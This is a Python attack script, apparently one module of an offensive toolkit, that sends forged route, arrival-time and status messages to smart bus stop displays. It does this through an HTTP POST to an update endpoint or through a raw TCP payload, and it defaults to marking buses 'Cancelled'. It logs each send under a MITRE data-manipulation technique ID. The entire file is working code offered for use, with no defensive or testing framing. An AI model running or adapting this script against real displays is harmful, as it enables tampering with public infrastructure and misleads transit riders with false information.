#!/usr/bin/env python3
# modules/attacks/bus_stop_info_spoofer.py

import argparse
import json
import os
import socket
import time
from datetime import datetime
import requests

LOG_FILE = "results/bus_spoof_log.json"
MITRE_TTP = "T1565.002"

def log_attack(ip, protocol, content):
    os.makedirs("results", exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps({
            "timestamp": datetime.utcnow().isoformat(),
            "target_ip": ip,
            "protocol": protocol,
            "payload": content,
            "ttp": MITRE_TTP
        }) + "\n")

def spoof_http(ip, route, eta, status):
    try:
        url = f"http://{ip}/api/update_bus"
        data = {
            "route": route,
            "eta": eta,
            "status": status
        }
        r = requests.post(url, json=data, timeout=4)
        if r.status_code == 200:
            print(f"[✓] Bus stop display updated at {ip}")
            log_attack(ip, "http", data)
        else:
            print(f"[!] HTTP update failed with code {r.status_code}")
    except Exception as e:
        print(f"[!] HTTP spoof error: {e}")

def spoof_tcp(ip, port, route, eta, status):
    payload = f"ROUTE:{route};ETA:{eta};STATUS:{status}"
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        sock.sendall(payload.encode())
        sock.close()
        print(f"[✓] TCP spoof sent to {ip}:{port}")
        log_attack(ip, "tcp", payload)
    except Exception as e:
        print(f"[!] TCP spoof failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Spoof data to smart bus stop displays")
    parser.add_argument("--ip", required=True, help="Target display IP")
    parser.add_argument("--route", required=True, help="Bus line (e.g., B45)")
    parser.add_argument("--eta", required=True, help="ETA in minutes (e.g., 999)")
    parser.add_argument("--status", default="Cancelled", help="Status (e.g., Delayed, Cancelled)")
    parser.add_argument("--protocol", choices=["http", "tcp"], required=True)
    parser.add_argument("--port", type=int, default=9090, help="TCP port if applicable")
    args = parser.parse_args()

    if args.protocol == "http":
        spoof_http(args.ip, args.route, args.eta, args.status)
    else:
        spoof_tcp(args.ip, args.port, args.route, args.eta, args.status)
